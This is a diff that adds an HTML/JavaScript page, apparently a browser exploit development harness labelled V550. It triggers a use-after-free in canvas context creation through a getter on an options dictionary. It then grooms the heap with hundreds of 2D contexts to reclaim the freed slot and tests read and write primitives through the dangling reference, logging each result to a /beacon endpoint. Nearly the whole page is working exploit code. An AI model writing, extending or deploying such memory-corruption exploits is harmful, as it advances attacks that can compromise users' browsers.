@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V550</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V550-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V550-safe-only');
+
+// T1: canvas.width reset — does it free the context?
+(function T1(){
+  b('T1-START','canvas.width reset');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    canvases.push(c);
+    var nc=c.getContext('2d');
+    nc.lineWidth=i+1;
+    ctxs.push(nc);
+  }
+
+  ctx.lineWidth=11111.11;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===11111.11){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T1-NOALIAS','not found');return}
+  b('T1-ALIAS','idx='+aliasIdx);
+
+  // Reset the aliased canvas
+  canvases[aliasIdx].width=canvases[aliasIdx].width;
+  b('T1-RESET','done');
+
+  // Read lineWidth — 1=state reset but context alive, crash=freed, 11111.11=nothing happened
+  try{
+    var lw=ctx.lineWidth;
+    b('T1-LW','val='+lw);
+  }catch(e){b('T1-LW-ERR',e.message)}
+
+  // Also read through the legitimate ref
+  try{
+    var lw2=ctxs[aliasIdx].lineWidth;
+    b('T1-LW2','legit val='+lw2);
+  }catch(e){b('T1-LW2-ERR',e.message)}
+})();
+
+// T2: stateStack growth — save many times, check font through alias
+(function T2(){
+  b('T2-START','stateStack growth');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+
+  ctx.lineWidth=22222.22;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===22222.22){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T2-NOALIAS','not found');return}
+  b('T2-ALIAS','idx='+aliasIdx);
+
+  // Read font, fillStyle, globalAlpha, textAlign, textBaseline through dangling ref
+  try{
+    b('T2-FONT',ctx.font);
+    b('T2-FILL',ctx.fillStyle);
+    b('T2-STROKE',ctx.strokeStyle);
+    b('T2-ALPHA',''+ctx.globalAlpha);
+    b('T2-TEXTA',ctx.textAlign);
+    b('T2-TEXTB',ctx.textBaseline);
+    b('T2-COMP',ctx.globalCompositeOperation);
+    b('T2-MITER',''+ctx.miterLimit);
+    b('T2-CAP',ctx.lineCap);
+    b('T2-JOIN',ctx.lineJoin);
+    b('T2-DASH',JSON.stringify(ctx.getLineDash()));
+    b('T2-SHBLUR',''+ctx.shadowBlur);
+    b('T2-SHCOL',ctx.shadowColor);
+  }catch(e){b('T2-ERR',e.message)}
+
+  // Set font through alias, read through dangling
+  try{
+    ctxs[aliasIdx].font='48px serif';
+    b('T2-FONTSET',ctx.font);
+  }catch(e){b('T2-FONTSET-ERR',e.message)}
+})();
+
+// T3: Grow stateStack with many saves, then restore all
+// This exercises the stateStack growth/copy path
+(function T3(){
+  b('T3-START','stateStack growth via save');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+
+  ctx.lineWidth=33333.33;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===33333.33){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T3-NOALIAS','not found');return}
+  b('T3-ALIAS','idx='+aliasIdx);
+
+  // Save many times through dangling ref
+  var saveCount=0;
+  try{
+    for(var i=0;i<100;i++){
+      ctx.save();
+      saveCount++;
+    }
+    b('T3-SAVED',''+saveCount+' saves ok');
+  }catch(e){b('T3-SAVE-ERR','at '+saveCount+': '+e.message)}
+
+  // Set lineWidth through legit ref (this triggers realizeSaves!)
+  try{
+    ctxs[aliasIdx].lineWidth=44444.44;
+    b('T3-REALIZE','set lw through legit after 100 saves: ok');
+  }catch(e){b('T3-REALIZE-ERR',e.message)}
+
+  // Read back through dangling ref
+  try{
+    var lw=ctx.lineWidth;
+    b('T3-LW','val='+lw);
+  }catch(e){b('T3-LW-ERR',e.message)}
+
+  // Restore all
+  try{
+    for(var i=0;i<100;i++){
+      ctx.restore();
+    }
+    b('T3-RESTORED','100 restores ok');
+  }catch(e){b('T3-RESTORE-ERR',e.message)}
+
+  // Check lineWidth went back to 33333.33
+  try{
+    var lw2=ctx.lineWidth;
+    b('T3-LW2','after restore val='+lw2);
+  }catch(e){b('T3-LW2-ERR',e.message)}
+})();
+
+// T4: putImageData / getImageData through alias
+// Can we read/write pixel data of the aliased canvas?
+(function T4(){
+  b('T4-START','imageData through alias');
+  var ctx=triggerUAF();
+
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=4;c.height=4;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+    ctxs[i].lineWidth=i+1;
+  }
+
+  ctx.lineWidth=55555.55;
+  var aliasIdx=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===55555.55){aliasIdx=i;break}
+  }
+  if(aliasIdx<0){b('T4-NOALIAS','not found');return}
+  b('T4-ALIAS','idx='+aliasIdx);
+
+  // Draw something through the legitimate ref
+  try{
+    ctxs[aliasIdx].fillStyle='#ff0000';
+    ctxs[aliasIdx].fillRect(0,0,4,4);
+    b('T4-DRAW','filled red via legit');
+  }catch(e){b('T4-DRAW-ERR',e.message)}
+
+  // Read pixel data through the dangling ref
+  try{
+    var id=ctx.getImageData(0,0,1,1);
+    b('T4-PIXEL','r='+id.data[0]+',g='+id.data[1]+',b='+id.data[2]+',a='+id.data[3]);
+  }catch(e){b('T4-PIXEL-ERR',e.message)}
+
+  // Can we toDataURL the aliased canvas?
+  try{
+    var url=canvases[aliasIdx].toDataURL();
+    b('T4-DATAURL','len='+url.length);
+  }catch(e){b('T4-DATAURL-ERR',e.message)}
+})();
+
+// T5: Multiple UAFs — can we create MANY dangling refs to the same slot?
+(function T5(){
+  b('T5-START','multiple UAFs');
+  var ctx1=triggerUAF();
+  // Same-type reclaim for ctx1
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  ctx1.lineWidth=77777.77;
+
+  // Now trigger SECOND UAF
+  var ctx2=triggerUAF();
+  // Same-type reclaim for ctx2
+  var ctxs2=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs2.push(c.getContext('2d'));
+  }
+  ctx2.lineWidth=88888.88;
+
+  // Check if ctx1 still works (should — its reclaiming context is still alive)
+  try{
+    var lw1=ctx1.lineWidth;
+    b('T5-LW1','ctx1='+lw1);
+  }catch(e){b('T5-LW1-ERR',e.message)}
+
+  try{
+    var lw2=ctx2.lineWidth;
+    b('T5-LW2','ctx2='+lw2);
+  }catch(e){b('T5-LW2-ERR',e.message)}
+
+  // Are they different objects?
+  b('T5-SAME','ctx1===ctx2: '+(ctx1===ctx2));
+})();
+
+b('DONE','V550-all-complete');
+</script>
+</body></html>
